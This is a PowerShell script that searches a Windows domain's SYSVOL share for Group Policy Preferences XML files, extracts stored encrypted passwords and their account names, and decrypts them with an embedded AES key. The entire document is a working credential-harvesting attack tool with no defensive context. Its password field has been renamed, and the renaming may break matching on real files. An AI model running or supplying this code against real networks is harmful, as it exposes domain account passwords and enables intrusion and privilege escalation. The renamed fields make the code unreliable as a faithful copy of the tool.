function Get-gpswd {

    
    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN
    )

    Set-StrictMode -Version 2
    
    function Get-Decryptedcpswd {
        [CmdletBinding()]
        Param (
            [string] $cpswd 
        )

        try {
            $Mod = ($cpswd.length % 4)
            
            switch ($Mod) {
            '1' {$cpswd = $cpswd.Substring(0,$cpswd.Length -1)}
            '2' {$cpswd += ('=' * (4 - $Mod))}
            '3' {$cpswd += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($cpswd)
            
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            $cpswd = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            if ($Xml.innerxml -like "*cpswd*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {

                    'Groups.xml' {
                        $cpswd += , $Xml | Select-Xml "/Groups/User/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $cpswd += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $cpswd += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $cpswd += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $cpswd += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $cpswd += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpswd" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $cpswd) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-Decryptedcpswd $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               $Password += , $DecryptedPassword
           }
            
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }

        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
        $XMlFiles = Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}
